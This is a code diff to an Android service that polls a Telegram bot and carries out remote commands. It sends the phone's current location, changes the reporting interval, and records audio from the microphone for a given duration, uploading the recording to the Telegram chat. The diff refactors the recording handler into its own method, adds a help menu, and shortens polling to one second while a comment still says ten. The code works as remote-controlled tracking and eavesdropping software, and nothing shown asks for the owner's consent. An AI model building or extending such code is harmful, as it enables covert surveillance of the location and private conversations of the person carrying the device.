@@ -42,40 +42,74 @@ public class LocationService extends Service {
     private int interval;
 
     private final Handler commandHandler = new Handler();
+
     private final Runnable commandRunnable = new Runnable() {
         @Override
         public void run() {
             telegramHelper.checkCommands(token, chatId, command -> {
-                if (command.trim().equalsIgnoreCase("/status")) {
+                String cmd = command.trim().toLowerCase();
+
+                if (cmd.equals("/status")) {
                     handleStatusCommand();
-                }
-                else if (command.equals("/lokasi")) {
+
+                } else if (cmd.equals("/lokasi")) {
                     sendCurrentLocation();
-                }
-                else if (command.startsWith("/interval")) {
+
+                } else if (cmd.startsWith("/interval")) {
                     handleIntervalCommand(command);
+
+                } else if (cmd.startsWith("/record")) {
+                    handleRecordCommand(command);
+
+                } else if (cmd.equals("/help")) {
+                    sendHelpMessage();
+
+                } else {
+                    telegramHelper.sendMessage(token, chatId, getHelpText("❓ Perintah tidak dikenali."));
                 }
-                else if (command.startsWith("/record")) {
-                    String[] parts = command.split(" ");
-                    int duration = 60; // default
-
-                    if (parts.length >= 2) {
-                        try {
-                            duration = Integer.parseInt(parts[1]);
-                        } catch (NumberFormatException e) {
-                            telegramHelper.sendMessage(token, chatId, "Format salah. Contoh: /record 30");
-                            return;
-                        }
-                    }
-
-                    telegramHelper.sendMessage(token, chatId, "Merekam suara selama " + duration + " detik...");
-                    VoiceRecorder.getInstance().startRecording(getApplicationContext(), duration, token, chatId);
-                }
-
             });
-            commandHandler.postDelayed(this, 10000); // periksa setiap 60 detik
+
+
+            commandHandler.postDelayed(this, 1000); // periksa setiap 10 detik
         }
     };
+
+
+    private void handleRecordCommand(String command) {
+        String[] parts = command.split(" ");
+        int duration = 60; // default
+
+        if (parts.length >= 2) {
+            try {
+                duration = Integer.parseInt(parts[1]);
+            } catch (NumberFormatException e) {
+                telegramHelper.sendMessage(token, chatId, "❌ Format salah. Contoh: /record 30");
+                return;
+            }
+        }
+
+        telegramHelper.sendMessage(token, chatId, "🎙️ Merekam suara selama " + duration + " detik...");
+        VoiceRecorder.getInstance().startRecording(getApplicationContext(), duration, token, chatId);
+
+        Intent intent = new Intent(getApplicationContext(), RecordActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.putExtra("duration", duration);
+        intent.putExtra("token", token);
+        intent.putExtra("chatId", chatId);
+        startActivity(intent);
+    }
+    private void sendHelpMessage() {
+        telegramHelper.sendMessage(token, chatId, getHelpText("📘 *Daftar Perintah Tersedia:*"));
+    }
+
+    private String getHelpText(String header) {
+        return header + "\n\n" +
+                "🆔 /status — Status GPS dan interval\n" +
+                "📍 /lokasi — Kirim lokasi terkini\n" +
+                "⏱️ /interval 30 — Ubah interval (detik, min 10)\n" +
+                "🎙️ /record 30 — Rekam suara (durasi detik)\n" +
+                "📘 /help — Tampilkan daftar perintah";
+    }
 
     @Override
     public void onCreate() {
